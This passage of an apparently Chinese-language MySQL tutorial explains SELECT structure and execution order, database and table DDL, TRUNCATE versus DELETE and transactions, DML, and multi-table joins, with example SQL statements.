<td style="text-align:center">&#x6027;&#x80FD;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x8BB0;&#x5F55; MySQL Server &#x8FD0;&#x884C;&#x8FC7;&#x7A0B;&#x4E2D;&#x7684;&#x4E00;&#x4E9B;&#x8D44;&#x6E90;&#x6D88;&#x8017;&#x76F8;&#x5173;&#x4FE1;&#x606F;</td>
</tr>
<tr>
<td style="text-align:center">mysql</td>
<td style="text-align:center">&#x7528;&#x4E8E;&#x5B58;&#x50A8;&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x8005;&#x7684;&#x7528;&#x6237;&#x4FE1;&#x606F;&#x3001;&#x6743;&#x9650;&#x4FE1;&#x606F;&#x4EE5;&#x53CA;&#x65E5;&#x5FD7;&#x4FE1;&#x606F;</td>
</tr>
<tr>
<td style="text-align:center">sys</td>
<td style="text-align:center">&#x7B80;&#x6613;&#x7248;&#x7684; performance_schema&#xFF0C;&#x5C06;&#x6027;&#x80FD;&#x6570;&#x636E;&#x5E93;&#x7684;&#x6570;&#x636E;&#x6C47;&#x603B;&#x6210;&#x6613;&#x7406;&#x89E3;&#x5F62;&#x5F0F;</td>
</tr>
</tbody>
</table>
<p>SELECT &#x8BED;&#x53E5;&#x5B8C;&#x6574;&#x7ED3;&#x6784;&#xFF1A;</p>
<ul>
<li><code>SELECT</code>&#xFF1A;&#x8981;&#x8FD4;&#x56DE;&#x7684;&#x5217;&#x6216;&#x8005;&#x8868;&#x8FBE;&#x5F0F; -&gt; &#x5FC5;&#x987B;&#x4F7F;&#x7528;</li>
<li><code>FROM</code>&#xFF1A;&#x68C0;&#x7D22;&#x6570;&#x636E;&#x7684;&#x8868; -&gt; &#x4EC5;&#x5728;&#x4ECE;&#x8868;&#x4E2D;&#x9009;&#x62E9;&#x6570;&#x636E;&#x65F6;&#x4F7F;&#x7528;</li>
<li><code>WHERE</code>&#xFF1A;&#x884C;&#x7EA7;&#x8FC7;&#x6EE4; -&gt; &#x975E;&#x5FC5;&#x987B;&#x4F7F;&#x7528;</li>
<li><code>GROUP BY</code>&#xFF1A;&#x5206;&#x7EC4;&#x8BF4;&#x660E; -&gt; &#x4EC5;&#x5728;&#x6309;&#x7EC4;&#x8BA1;&#x7B97;&#x805A;&#x96C6;&#x65F6;&#x4F7F;&#x7528;</li>
<li><code>HAVING</code>&#xFF1A;&#x7EC4;&#x7EA7;&#x8FC7;&#x6EE4; -&gt; &#x975E;&#x5FC5;&#x987B;&#x4F7F;&#x7528;</li>
<li><code>ORDER BY</code>&#xFF1A;&#x8F93;&#x51FA;&#x6392;&#x5E8F;&#x987A;&#x5E8F; -&gt; &#x975E;&#x5FC5;&#x987B;&#x4F7F;&#x7528;</li>
<li><code>LIMIT</code>&#xFF1A;&#x8981;&#x68C0;&#x7D22;&#x7684;&#x884C;&#x6570; -&gt; &#x975E;&#x5FC5;&#x987B;&#x4F7F;&#x7528;</li>
</ul>
<pre><code class="language-javascript">// sql92
SELECT ...(&#x805A;&#x5408;&#x51FD;&#x6570;) FROM ... WHERE &#x591A;&#x8868;&#x8FDE;&#x63A5;&#x6761;&#x4EF6; AND &#x4E0D;&#x5305;&#x542B;&#x805A;&#x5408;&#x51FD;&#x6570;&#x7684;&#x8FC7;&#x6EE4;&#x6761;&#x4EF6; GROUP BY ... HAVING &#x5305;&#x542B;&#x805A;&#x5408;&#x51FD;&#x6570;&#x7684;&#x8FC7;&#x6EE4;&#x6761;&#x4EF6; ORDER BY ...(ASC/DESC) LIMIT ...
// sql99
SELECT ...(&#x805A;&#x5408;&#x51FD;&#x6570;) FROM ... (LEFT/RIGHT) JOIN ... ON ... (&#x591A;&#x8868;&#x7684;&#x8FDE;&#x63A5;&#x6761;&#x4EF6;) (LEFT/RIGHT) JOIN ... ON ... (&#x591A;&#x8868;&#x7684;&#x8FDE;&#x63A5;&#x6761;&#x4EF6;) WHERE &#x4E0D;&#x5305;&#x542B;&#x805A;&#x5408;&#x51FD;&#x6570;&#x7684;&#x8FC7;&#x6EE4;&#x6761;&#x4EF6; GROUP BY ... HAVING &#x5305;&#x542B;&#x805A;&#x5408;&#x51FD;&#x6570;&#x7684;&#x8FC7;&#x6EE4;&#x6761;&#x4EF6; ORDER BY ...(ASC/DESC) LIMIT ...
</code></pre>
<h3 id="sql-%E5%BA%95%E5%B1%82%E6%89%A7%E8%A1%8C%E5%8E%9F%E7%90%86%EF%BC%9A%E4%BA%A7%E7%94%9F%E4%B8%80%E7%B3%BB%E5%88%97%E8%99%9A%E6%8B%9F%E8%A1%A8">SQL &#x5E95;&#x5C42;&#x6267;&#x884C;&#x539F;&#x7406;&#xFF1A;&#x4EA7;&#x751F;&#x4E00;&#x7CFB;&#x5217;&#x865A;&#x62DF;&#x8868;</h3>
<p>&#x5148;&#x6267;&#x884C; <code>FROM</code> &#x5173;&#x952E;&#x5B57;&#xFF0C;&#x591A;&#x8868;&#x8054;&#x67E5;&#x4F1A;&#x901A;&#x8FC7; <code>CROSS JOIN</code> &#x6C42;&#x7B1B;&#x5361;&#x5C14;&#x79EF;&#xFF0C;&#x5C06;&#x5F97;&#x5230;&#x7684;&#x865A;&#x62DF;&#x8868;&#x8FDB;&#x884C; <code>ON</code> &#x7B5B;&#x9009;&#xFF0C;&#x6B64;&#x8FC7;&#x7A0B;&#x5728; VT1-1 &#x7684;&#x57FA;&#x7840;&#x4E0A;&#x5F97;&#x5230; VT1-2&#x3002;&#x82E5;&#x4F7F;&#x7528;&#x5230;&#x5DE6;&#x3001;&#x53F3;&#x8FDE;&#x63A5;&#x6216;&#x8005;&#x5168;&#x8FDE;&#x63A5;&#xFF0C;&#x90A3;&#x4E48;&#x4F1A;&#x5728; VT1-2 &#x7684;&#x57FA;&#x7840;&#x4E0A;&#x589E;&#x52A0;&#x5916;&#x90E8;&#x884C;&#x4EA7;&#x751F; VT1-3&#x3002;</p>
<p>&#x901A;&#x8FC7; VT1 &#x83B7;&#x53D6;&#x539F;&#x59CB;&#x6570;&#x636E;&#x540E;&#x8FDB;&#x884C; <code>WHERE</code> &#x64CD;&#x4F5C;&#xFF0C;&#x6839;&#x636E;&#x7ED3;&#x679C;&#x7B5B;&#x9009;&#x8FC7;&#x6EE4;&#x5F97;&#x5230; VT2&#x3002;</p>
<p><code>GROUP BY</code> &#x548C; <code>HAVING</code> &#x5BF9; VT2 &#x8FDB;&#x884C;&#x5206;&#x7EC4;&#x548C;&#x8FC7;&#x6EE4;&#x5F97;&#x5230; VT3 &#x548C; VT4&#x3002;</p>
<p><code>SELECT</code> &#x548C; <code>DISTINCT</code> &#x63D0;&#x53D6;&#x6240;&#x9700;&#x5B57;&#x6BB5;&#x5E76;&#x8FC7;&#x6EE4;&#x6389;&#x91CD;&#x590D;&#x7684;&#x884C;&#x5F97;&#x5230; VT5-1 &#x548C; VT5-2&#x3002;</p>
<p><code>ORDER BY</code> &#x548C; <code>LIMIT</code> &#x5BF9;&#x6307;&#x5B9A;&#x7684;&#x5B57;&#x6BB5;&#x6392;&#x5E8F;&#x5E76;&#x901A;&#x8FC7;&#x5206;&#x9875;&#x53D6;&#x51FA;&#x6307;&#x5B9A;&#x884C;&#xFF0C;&#x5F97;&#x5230;&#x6700;&#x7EC8;&#x7684; VT6 &#x4E0E; VT7&#x3002;</p>
<pre><code class="language-javascript">// FROM &#x9996;&#x5148;&#x52A0;&#x8F7D;&#x3001;SELECT &#x89C6;&#x4F5C;&#x7D22;&#x5F15;&#x9996;&#x4F4D;&#x5904;&#x4E8E;&#x7B2C;&#x4E8C;&#x52A0;&#x8F7D;&#x3001;ORDER BY &#x4E0E; LIMIT &#x770B;&#x4F5C;&#x7D22;&#x5F15;&#x672B;&#x5C3E;&#x6700;&#x540E;&#x52A0;&#x8F7D;
FROM ... &#x591A;&#x8868;&#x8054;&#x67E5;&#x4F1A;&#x5148; CROSS JOIN &#x6C42;&#x7B1B;&#x5361;&#x5C14;&#x79EF; =&gt; ON &#x8FDE;&#x63A5;&#x6761;&#x4EF6;&#x8FC7;&#x6EE4; =&gt; &#x5173;&#x6CE8;&#x5DE6;&#x53F3;&#x8FDE;&#x63A5; =&gt; WHERE &#x8FC7;&#x6EE4;&#x6570;&#x636E; =&gt; GROUP BY &#x6309;&#x8981;&#x6C42;&#x5206;&#x7EC4; =&gt; HAVING &#x805A;&#x5408;&#x6761;&#x4EF6;&#x7B5B;&#x9009; =&gt; SELECT =&gt; DISTINCT =&gt; ORDER BY =&gt; LIMIT
</code></pre>
<h3 id="%E5%88%9B%E5%BB%BA%E5%B9%B6%E7%AE%A1%E7%90%86%E6%95%B0%E6%8D%AE%E5%BA%93">&#x521B;&#x5EFA;&#x5E76;&#x7BA1;&#x7406;&#x6570;&#x636E;&#x5E93;</h3>
<p>&#x4EC5;&#x901A;&#x8FC7; <code>CREATE DATABASE</code> &#x521B;&#x5EFA;&#x6570;&#x636E;&#x5E93;&#x65F6;&#xFF0C;&#x5B57;&#x7B26;&#x96C6;&#x4F1A;&#x4F7F;&#x7528;&#x6570;&#x636E;&#x5E93;&#x7684;&#x9ED8;&#x8BA4;&#x8BBE;&#x7F6E;&#x3002;</p>
<p>&#x663E;&#x793A;&#x6307;&#x660E;&#x5B57;&#x7B26;&#x96C6;&#xFF1A;<code>CREATE DATABASE &#x6570;&#x636E;&#x5E93;&#x540D; CHARACTER SET &apos;&#x5B57;&#x7B26;&#x96C6;&apos;;</code>&#x3002;</p>
<pre><code class="language-sql"># &#x521B;&#x5EFA;&#x6570;&#x636E;&#x5E93;&#x82E5;&#x5B58;&#x5728; =&gt; &#x4E0D;&#x6210;&#x529F;&#x4E0D;&#x62A5;&#x9519;
CREATE DATABASE IF NOT EXISTS &#x6570;&#x636E;&#x5E93;&#x540D; CHARACTER SET &apos;&#x5B57;&#x7B26;&#x96C6;&apos;;
</code></pre>
<p>&#x66F4;&#x6539;&#x73B0;&#x6709;&#x6570;&#x636E;&#x5E93;&#x5B57;&#x7B26;&#x96C6;&#xFF1A;<code>ALTER DATABASE &#x6570;&#x636E;&#x5E93;&#x540D; CHARACTER SET &#x5B57;&#x7B26;&#x96C6;;</code>&#x3002;</p>
<p>&#x533A;&#x5206; <code>SHOW DATABASES;</code> &amp; <code>SELECT DATABASE();</code>&#xFF1A;&#x524D;&#x8005;&#x67E5;&#x770B;&#x6240;&#x6709;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x540E;&#x8005;&#x662F;&#x901A;&#x8FC7;&#x4E00;&#x4E2A;&#x5168;&#x5C40;&#x51FD;&#x6570;&#x67E5;&#x770B;&#x5F53;&#x524D;&#x6B63;&#x5728;&#x4F7F;&#x7528;&#x7684;&#x6570;&#x636E;&#x5E93;&#x3002;</p>
<p>&#x67E5;&#x770B;&#x6307;&#x5B9A;&#x5E93;&#x4E0B;&#x7684;&#x6240;&#x6709;&#x8868;&#xFF1A;<code>SHOW TABLES FROM &#x6570;&#x636E;&#x5E93;&#x540D;;</code>&#x3002;</p>
<p>&#x67E5;&#x770B;&#x6570;&#x636E;&#x5E93;&#x7684;&#x521B;&#x5EFA;&#x8BED;&#x53E5;&#xFF1A;<code>SHOW CREATE DATABASE &#x6570;&#x636E;&#x5E93;&#x540D;\G</code>&#xFF0C;<code>\G</code> &#x8868;&#x793A;&#x683C;&#x5F0F;&#x5316;&#x8F93;&#x51FA;&#x4FE1;&#x606F;&#x3002;</p>
<p>&#x5220;&#x9664;&#x6570;&#x636E;&#x5E93;&#x65F6;&#x6700;&#x597D;&#x80FD;&#x52A0;&#x4EE5;&#x9650;&#x5236;&#xFF1A;<code>DROP DATABASE IF EXISTS &#x6570;&#x636E;&#x5E93;&#x540D;;</code>&#x3002;</p>
<p>&#x5EFA;&#x8868;&#x65F6;&#x5FC5;&#x987B;&#x6307;&#x5B9A;&#x8868;&#x540D;&#x3001;&#x5B57;&#x6BB5;&#x540D;&#x3001;<a href="https://dev.mysql.com/doc/refman/8.0/en/data-types.html">&#x7C7B;&#x578B;</a>&#x548C;&#x957F;&#x5EA6;&#xFF0C;&#x7EA6;&#x675F;&#x6761;&#x4EF6;&#x548C;&#x9ED8;&#x8BA4;&#x503C;&#x7684;&#x8BBE;&#x5B9A;&#x4E0D;&#x5FC5;&#x987B;&#x3002;</p>
<pre><code class="language-sql">CREATE TABLE IF NOT EXISTS myempl(id INT,emp_name VARCHAR(15),hire_date DATE);
</code></pre>
<p>&#x8868;&#x7684;&#x7ED3;&#x6784;&#x63CF;&#x8FF0;&#xFF1A;<code>DESC ???;</code>&#xFF1B;&#x8868;&#x7684;&#x521B;&#x5EFA;&#x8BED;&#x53E5;&#xFF1A;<code>SHOW CREATE TABLE ???;</code>&#x3002;</p>
<p>&#x5728;&#x73B0;&#x6709;&#x8868;&#x7684;&#x57FA;&#x7840;&#x4E0A;&#x521B;&#x5EFA;&#x65B0;&#x8868;&#xFF08;&#x9009;&#x62E9;&#x5B57;&#x6BB5;&#x522B;&#x540D;&#x4F5C;&#x4E3A;&#x65B0;&#x8868;&#x7684;&#x5B57;&#x6BB5;&#x540D;&#xFF09;&#x5E38;&#x5E94;&#x7528;&#x4E8E;&#x8868;&#x590D;&#x5236;&#x3002;</p>
<pre><code class="language-sql">CREATE TABLE &#x65B0;&#x8868;&#x540D; AS SELECT FIELD01 FIELD01ALIAS, FIELD02, ... FROM &#x73B0;&#x6709;&#x8868;;
</code></pre>
<pre><code class="language-sql"># &#x521B;&#x5EFA;&#x65B0;&#x8868; employees_copy &#x5B9E;&#x73B0;&#x5BF9; employees &#x8868;&#x590D;&#x5236; =&gt; &#x5305;&#x542B;&#x8868;&#x6570;&#x636E;
CREATE TABLE employees_copy AS SELECT * FROM employees;
# &#x521B;&#x5EFA;&#x65B0;&#x8868; employees_copy &#x5B9E;&#x73B0;&#x5BF9; employees &#x8868;&#x590D;&#x5236; =&gt; &#x4E0D;&#x5305;&#x542B;&#x8868;&#x6570;&#x636E; =&gt; &#x4E0D;&#x53EF;&#x80FD;&#x6761;&#x4EF6;
CREATE TABLE employees_copy AS SELECT * FROM employees WHERE department_id &gt; 10000;
CREATE TABLE employees_copy AS SELECT * FROM employees WHERE 1=2;
</code></pre>
<p>&#x4FEE;&#x6539;&#x8868; <code>ALTER TABLE ???</code> &#x540E;&#x8FB9;&#x53EF;&#x4EE5;&#x6307;&#x5B9A;&#x5177;&#x4F53;&#x6267;&#x884C;&#x7684;&#x64CD;&#x4F5C;&#xFF1A;</p>
<ul>
<li>&#x6DFB;&#x52A0;&#x5B57;&#x6BB5;&#xFF1A;<code>... ADD &#x5B57;&#x6BB5;&#x540D; &#x5B57;&#x6BB5;&#x7C7B;&#x578B; [FIRST|AFTER &#x5B57;&#x6BB5;&#x540D;];</code></li>
<li>&#x4FEE;&#x6539;&#x5B57;&#x6BB5;&#xFF08;&#x901A;&#x5E38;&#x4E0D;&#x4FEE;&#x6539;&#x7C7B;&#x578B;&#xFF09;&#xFF1A;<code>... MODIFY FIELD TYPE DEFAULT X;</code></li>
<li>&#x91CD;&#x547D;&#x540D;&#x5B57;&#x6BB5;&#xFF1A;<code>... CHANGE old_col_name new_col_name TYPE;</code></li>
<li>&#x5220;&#x9664;&#x5B57;&#x6BB5;&#xFF1A;<code>... DROP COLUMN col_name;</code></li>
</ul>
<p>&#x91CD;&#x547D;&#x540D;&#x8868;&#xFF1A;</p>
<ul>
<li><code>RENAME TABLE old_name TO new_name;</code></li>
<li><code>ALTER TABLE old_name RENAME TO new_name;</code></li>
</ul>
<p>&#x5220;&#x9664;&#x8868;&#x6570;&#x636E;&#xFF1A;</p>
<ul>
<li><code>DROP ???</code>&#xFF1A;&#x8868;&#x7684;&#x7ED3;&#x6784;&#x548C;&#x6570;&#x636E;&#x90FD;&#x4F1A;&#x88AB;&#x5220;&#x9664;&#xFF0C;&#x4E14;&#x91CA;&#x653E;&#x7A7A;&#x95F4;</li>
<li><code>TRUNCATE ???</code>&#xFF1A;&#x4EC5;&#x6E05;&#x7A7A;&#x8868;&#x4E2D;&#x7684;&#x6240;&#x6709;&#x6570;&#x636E;&#xFF0C;&#x8868;&#x7ED3;&#x6784;&#x4F1A;&#x88AB;&#x4FDD;&#x7559;</li>
</ul>
<p>&#x6267;&#x884C; <code>COMMIT</code> &#x63D0;&#x4EA4;&#x7684;&#x6570;&#x636E;&#x4F1A;&#x88AB;&#x6C38;&#x4E45;&#x4FDD;&#x5B58;&#xFF0C;&#x4E0D;&#x53EF;&#x56DE;&#x6EDA;&#xFF0C;&#x540E;&#x7EED;&#x4FEE;&#x6539;&#x9700;&#x63D0;&#x4EA4;&#x4E8B;&#x52A1;&#x3002;</p>
<p><code>ROLLBACK</code> &#x53EF;&#x4EE5;&#x4F7F;&#x5F97;&#x6570;&#x636E;&#x56DE;&#x6EDA;&#x5230;&#x6700;&#x8FD1;&#x4E00;&#x6B21; <code>COMMIT</code> &#x4E4B;&#x540E;&#xFF1A;</p>
<ul>
<li>&#x6267;&#x884C;&#x8FC7; <code>TRUNCATE</code> &#x4E0D;&#x80FD;&#x56DE;&#x6EDA;</li>
<li>&#x4F7F;&#x7528; <code>DELETE</code> &#x8BED;&#x53E5;&#x5220;&#x9664;&#x7684;&#x6570;&#x636E;&#x53EF;&#x4EE5;&#x56DE;&#x6EDA;</li>
</ul>
<p>DDL &#x7684;&#x64CD;&#x4F5C;&#x4E00;&#x65E6;&#x6267;&#x884C;&#x5C31;&#x4E0D;&#x53EF;&#x56DE;&#x6EDA;&#xFF0C;&#x6307;&#x4EE4; <code>SET autocommit = FALSE</code> &#x5BF9;&#x5176;&#x5931;&#x6548;&#x3002;</p>
<p>DDL &#x64CD;&#x4F5C;&#x4F1A;&#x8FFD;&#x52A0;&#x6267;&#x884C; <code>COMMIT</code>&#x3002;&#x6B64;&#x63D0;&#x4EA4;&#x4E0D;&#x53D7; <code>SET autocommit = FALSE</code> &#x5F71;&#x54CD;&#x3002;</p>
<p>&#x533A;&#x5206; <code>TRUNCATE</code> &#x548C; <code>DELETE</code>&#xFF1A;</p>
<ul>
<li><code>TRUNCATE</code> &#x5728;&#x529F;&#x80FD;&#x4E0A;&#x4E0E;&#x4E0D;&#x5E26; <code>WHERE</code> &#x7684; <code>DELETE</code> &#x8BED;&#x53E5;&#x76F8;&#x540C;</li>
<li>&#x867D;&#x7136; <code>TRUNCATE</code> &#x901F;&#x5EA6;&#x66F4;&#x5FEB;&#xFF0C;&#x4E14;&#x4F7F;&#x7528;&#x7684;&#x7CFB;&#x7EDF;&#x548C;&#x4E8B;&#x52A1;&#x65E5;&#x5FD7;&#x8D44;&#x6E90;&#x8F83;&#x5C11;&#xFF0C;&#x4F46;&#x65E0;&#x4E8B;&#x52A1;&#x548C;&#x4E0D;&#x89E6;&#x53D1; <code>TRIGGER</code> &#x6709;&#x53EF;&#x80FD;&#x4F1A;&#x9020;&#x6210;&#x4E8B;&#x6545;&#xFF0C;&#x4E0D;&#x5EFA;&#x8BAE;&#x5728;&#x5F00;&#x53D1;&#x73AF;&#x5883;&#x4E2D;&#x4F7F;&#x7528;&#x3002;</li>
</ul>
<h3 id="data-manipulation-language">Data manipulation language</h3>
<p>DML &#x662F;&#x4E00;&#x7CFB;&#x5217;&#x63CF;&#x8FF0;&#x589E;&#x5220;&#x6539;&#x64CD;&#x4F5C;&#x7684; SQL &#x8BED;&#x53E5;&#x3002;<code>SELECT</code> &#x6709;&#x65F6;&#x4E5F;&#x4F1A;&#x88AB;&#x5305;&#x62EC;&#x5176;&#x4E2D;&#x3002;</p>
<pre><code class="language-javascript">INSERT INTO [TABLE_NAME] (&#x5B57;&#x6BB5;1, &#x5B57;&#x6BB5;2, ...) SELECT &#x5BF9;&#x5E94;&#x5B57;&#x6BB5;1, &#x5BF9;&#x5E94;&#x5B57;&#x6BB5;2, ... FROM [TABLE_NAME_other] WHERE ...;
</code></pre>
<blockquote>
<p>DML statements for an InnoDB table operate in the context of a transaction, so their effects can be committed or rolled back as a single unit. <a href="https://dev.mysql.com/doc/refman/8.0/en/glossary.html#glos_dml">dev.mysql</a></p>
</blockquote>
<p>DML &#x64CD;&#x4F5C;&#x540C;&#x6837;&#x9ED8;&#x8BA4;&#x4E3A;&#x6267;&#x884C;&#x540E;&#x4E0D;&#x80FD;&#x56DE;&#x6EDA;&#x3002;&#x82E5;&#x5728;&#x6267;&#x884C;&#x64CD;&#x4F5C;&#x524D;&#x6307;&#x5B9A; <code>SET autocommit = FALSE</code>&#xFF0C;&#x90A3;&#x4E48;&#x6267;&#x884C;&#x7684; DML &#x64CD;&#x4F5C;&#x4F9D;&#x7136;&#x53EF;&#x56DE;&#x6EDA;&#x3002;</p>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="%E6%9F%A5%E8%AF%A2-%E5%87%BD%E6%95%B0">&#x67E5;&#x8BE2; &amp; &#x51FD;&#x6570;</h2>
<h3 id="multi-table-query-core-concepts">Multi-table Query Core Concepts</h3>
<p>&#x591A;&#x8868;&#x67E5;&#x8BE2;&#x4E5F;&#x79F0;&#x4E3A;&#x5173;&#x8054;&#x67E5;&#x8BE2;&#xFF0C;&#x662F;&#x7531;&#x591A;&#x4E2A;&#x8868;&#x4E00;&#x8D77;&#x5B8C;&#x6210;&#x7684;&#x67E5;&#x8BE2;&#x64CD;&#x4F5C;&#x3002;&#x591A;&#x8868;&#x67E5;&#x8BE2;&#x7684;&#x610F;&#x4E49;&#x5728;&#x4E8E;&#x51CF;&#x5C11;&#x7F51;&#x7EDC;&#x4EA4;&#x4E92;&#x6B21;&#x6570;&#x3002;&#x901A;&#x8FC7;&#x5355;&#x6761;&#x8BED;&#x53E5;&#x5B8C;&#x6210;&#x9700;&#x8981;&#x591A;&#x4E2A;&#x7B80;&#x5355; SQL &#x8BED;&#x53E5;&#x624D;&#x80FD;&#x5B8C;&#x6210;&#x7684;&#x76EE;&#x7684;&#x3002;</p>
<p>&#x591A;&#x8868;&#x67E5;&#x8BE2;&#x51FA;&#x73B0;&#x7B1B;&#x5361;&#x5C14;&#x4E58;&#x79EF;&#x7684;&#x539F;&#x56E0;&#x53EF;&#x80FD;&#x662F;&#x5173;&#x8054;&#x6761;&#x4EF6;&#x5931;&#x6548;&#xFF0C;&#x6216;&#x7701;&#x7565;&#x591A;&#x4E2A;&#x8868;&#x7684;&#x8FDE;&#x63A5;&#x6761;&#x4EF6;&#x3002;</p>
<pre><code class="language-javascript"># &#x7B1B;&#x5361;&#x5C14;&#x4E58;&#x79EF;&#x7684;&#x9519;&#x8BEF;&#x5F62;&#x5F0F;
SELECT employee_id,department_name FROM employees,departments;
SELECT * FROM employees,departments;
SELECT employee_id,department_name FROM employees CROSS JOIN departments;
</code></pre>
<p>&#x4ECE; SQL &#x4F18;&#x5316;&#x89D2;&#x5EA6;&#x6765;&#x8BF4;&#xFF0C;&#x5EFA;&#x8BAE;&#x591A;&#x8868;&#x67E5;&#x8BE2;&#x65F6;&#x5BF9;&#x6BCF;&#x4E2A;&#x5B57;&#x6BB5;&#x6307;&#x660E;&#x5176;&#x6240;&#x5728;&#x7684;&#x8868;&#x3002;</p>
<pre><code class="language-sql"># FROM &#x8BED;&#x53E5;&#x4F7F;&#x7528;&#x7684;&#x522B;&#x540D;&#x4E5F;&#x53EF;&#x4EE5;&#x5728; SELECT &#x8BED;&#x53E5;&#x91CC;&#x4F7F;&#x7528; =&gt; &#x8D77;&#x4E86;&#x522B;&#x540D;&#x5C31;&#x5FC5;&#x987B;&#x7528;&#x522B;&#x540D;
SELECT emp.employee_id,dept.department_name,emp.department_id FROM employees emp,departments dept WHERE emp.department_id = dept.department_id;
</code></pre>
<p>&#x5982;&#x679C;&#x6709; n &#x5F20;&#x8868;&#x8981;&#x5B9E;&#x73B0;&#x591A;&#x8868;&#x67E5;&#x8BE2;&#xFF0C;&#x5219;&#x81F3;&#x5C11;&#x9700;&#x8981; n-1 &#x4E2A;&#x8FDE;&#x63A5;&#x6761;&#x4EF6;&#x3002;</p>
<pre><code class="language-sql">SELECT emp.employee_id,emp.last_name,dept.department_name,emp.department_id,loc.city,loc.location_id FROM employees emp,departments dept,locations loc WHERE emp.department_id = dept.department_id AND dept.location_id = loc.location_id;
</code></pre>
<p>&#x5F53;&#x67E5;&#x8BE2;&#x8BF7;&#x6C42;&#x6D89;&#x53CA;&#x5230;&#x591A;&#x4E2A;&#x8868;&#xFF0C;&#x4E14;&#x8FDE;&#x63A5;&#x8868;&#x7684;&#x6761;&#x4EF6;&#x4E3A;&#x76F8;&#x7B49;&#x65F6;&#xFF0C;&#x5373;<strong>&#x7B49;&#x503C;&#x8FDE;&#x63A5;&#x67E5;&#x8BE2;</strong>&#xFF1B;&#x7531;&#x5176;&#x4ED6;&#x7684;&#x8FD0;&#x7B97;&#x7B26;&#x8FDE;&#x63A5;&#x5C31;&#x662F;<strong>&#x975E;&#x7B49;&#x503C;&#x67E5;&#x8BE2;</strong>&#x3002;</p>
<pre><code class="language-javascript">SELECT e.last_name,e.salary,j.grade_level FROM employees e, job_grades j WHERE e.salary &gt;= j.lowest_sal AND e.salary &lt;= j.highest_sal;
</code></pre>
<p>&#x4E0D;&#x540C;&#x8868;&#x4E4B;&#x95F4;&#x5B9E;&#x73B0;&#x8FDE;&#x63A5;&#x64CD;&#x4F5C;&#x79F0;&#x4E3A;<strong>&#x975E;&#x81EA;&#x8FDE;&#x63A5;</strong>&#xFF0C;&#x8868;&#x81EA;&#x884C;&#x4E0E;&#x81EA;&#x5DF1;&#x7684;&#x8FDE;&#x63A5;&#x79F0;&#x4E3A;<strong>&#x81EA;&#x8FDE;&#x63A5;</strong>&#x3002;</p>
<pre><code class="language-javascript"># &#x67E5;&#x8BE2;&#x5458;&#x5DE5;id&#x3001;&#x59D3;&#x540D;&#x4EE5;&#x53CA;&#x7BA1;&#x7406;&#x8005;&#x7684;id&#x3001;&#x59D3;&#x540D;
SELECT emp.employee_id,emp.last_name,mgr.employee_id,mgr.last_name FROM employees emp, employees mgr WHERE emp.manager_id = mgr.employee_id;
</code></pre>
<h3 id="inner-join-outer-join">Inner Join &amp; Outer Join</h3>
<p>The different types of the JOINs in SQL:</p>
<ul>
<li><code>(INNER) JOIN</code>: Returns records that have matching values in both tables</li>
<li><code>LEFT (OUTER) JOIN</code>: Returns all records from the left table, and the matched records from the right table</li>
<li><code>RIGHT (OUTER) JOIN</code>: Returns all records from the right table, and the matched records from the left table</li>
<li><code>FULL (OUTER) JOIN</code>: Returns all records when there is a match in either left or right table</li>
</ul>
<div style="display:flex;justify-content:center">
<img src="https://res.cloudinary.com/dzb9ldnvl/image/upload/v1672419528/blog/zsghost/mysql/SQLJOIN_afvffa.jpg" width="70%" alt="MySQL"></div>
<pre><code class="language-javascript"># &#x53F3;&#x4E0A;&#x56FE; =&gt; &#x53F3;&#x5916;&#x8FDE;&#x63A5;
SELECT employee_id,department_name FROM employees e RIGHT JOIN departments d ON e.department_id = d.department_id;
# &#x5DE6;&#x4E2D;&#x56FE;
SELECT employee_id,department_name FROM employees e LEFT JOIN departments d ON e.department_id = d.department_id WHERE d.department_id IS NULL;
# &#x53F3;&#x4E2D;&#x56FE;
SELECT employee_id,department_name FROM employees e RIGHT JOIN departments d ON e.department_id = d.department_id WHERE e.department_id IS NULL;
# &#x5DE6;&#x4E0B;&#x56FE; =&gt; &#x6EE1;&#x5916;&#x8FDE;&#x63A5; =&gt; &#x5DE6;&#x4E0A;&#x56FE; UNION ALL &#x53F3;&#x4E2D;&#x56FE;
SELECT employee_id,department_name FROM employees e LEFT OUTER JOIN departments d ON e.department_id = d.department_id UNION ALL SELECT employee_id,department_name FROM employees e RIGHT JOIN departments d ON e.department_id = d.department_id WHERE e.department_id IS NULL;
# &#x53F3;&#x4E0B;&#x56FE; =&gt; &#x5DE6;&#x4E2D;&#x56FE; UNION ALL &#x53F3;&#x4E2D;&#x56FE;
SELECT employee_id,department_name FROM employees e LEFT JOIN departments d ON e.department_id = d.department_id WHERE d.department_id IS NULL UNION ALL SELECT employee_id,department_name FROM employees e RIGHT JOIN departments d ON e.department_id = d.department_id WHERE e.department_id IS NULL; 
</code></pre>
<p>MySQL &#x4E0D;&#x652F;&#x6301; SQL92 &#x4E2D;&#x4EE5; <code>(+)</code> &#x6807;&#x8BB0;&#x4ECE;&#x8868;&#x4F4D;&#x7F6E;&#x7684;&#x5916;&#x8FDE;&#x63A5;&#x5199;&#x6CD5;&#x3002;</p>
<pre><code class="language-sql"># SQL92 &#x5B9E;&#x73B0;&#x5DE6;&#x5916;&#x8FDE;&#x63A5;
SELECT employee_id,department_name FROM employees e,departments d WHERE e.`department_id`=d.`department_id`(+);
</code></pre>
<p>MySQL &#x4E0D;&#x652F;&#x6301;&#x5168;&#x5916;&#x8FDE;&#x63A5; <code>FULL OUTER JOIN</code> &#x5199;&#x6CD5;&#xFF0C;&#x9700;&#x8981;&#x5229;&#x7528; <code>UNION</code> &#x5B9E;&#x73B0;&#x5168;&#x5916;&#x8FDE;&#x63A5;&#x64CD;&#x4F5C;&#x3002;<code>UNION</code> &#x53EF;&#x4EE5;&#x5C06;&#x591A;&#x6761; <code>SELECT</code> &#x8BED;&#x53E5;&#x7684;&#x7ED3;&#x679C;&#x7EC4;&#x6210;&#x5355;&#x4E2A;&#x7ED3;&#x679C;&#x96C6;&#x3002;</p>
<pre><code class="language-javascript">SELECT column,... FROM table1 UNION [ALL] SELECT column,... FROM table2;
</code></pre>
